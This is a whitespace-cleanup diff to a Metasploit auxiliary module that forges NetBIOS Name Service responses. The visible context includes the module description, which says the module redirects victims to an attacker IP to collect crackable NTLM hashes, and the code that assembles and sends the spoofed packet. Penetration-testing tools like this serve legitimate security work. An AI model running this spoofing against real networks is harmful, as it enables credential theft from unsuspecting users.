@@ -21,7 +21,7 @@ class Metasploit3 < Msf::Auxiliary
 			'Description'    => %q{
 					This module forges NetBIOS Name Service (NBNS) responses. It will listen for NBNS requests
 					sent to the local subnet's broadcast address and spoof a response, redirecting the querying
-					machine to an IP of the attacker's choosing. Combined with auxiliary/capture/server/smb or 
+					machine to an IP of the attacker's choosing. Combined with auxiliary/capture/server/smb or
 					capture/server/http_ntlm it is a highly effective means of collecting crackable hashes on
 					common networks.
 					
@@ -114,8 +114,8 @@ class Metasploit3 < Msf::Auxiliary
 				end
 
 				# time to build a response packet - Oh YEAH!
-				response = nbnsq_transid + 
-					"\x85\x00" + # Flags = response + authoratative + recursion desired + 
+				response = nbnsq_transid +
+					"\x85\x00" + # Flags = response + authoratative + recursion desired +
 					"\x00\x00" + # Questions = 0
 					"\x00\x01" + # Answer RRs = 1
 					"\x00\x00" + # Authority RRs = 0
@@ -128,13 +128,13 @@ class Metasploit3 < Msf::Auxiliary
 					"\x00\x00" + # Flags B-node, unique = whet ever that means
 					datastore['SPOOFIP'].split('.').collect(&:to_i).pack('C*')
 
-				open_pcap 
+				open_pcap
 
 				p = PacketFu::UDPPacket.new
 				p.ip_saddr = Rex::Socket.source_address(rhost)
 				p.ip_daddr = rhost
 				p.ip_ttl = 255
-				p.udp_sport = 1337 
+				p.udp_sport = 1337
 				p.udp_dport = 137
 				p.payload = response
 				p.recalc
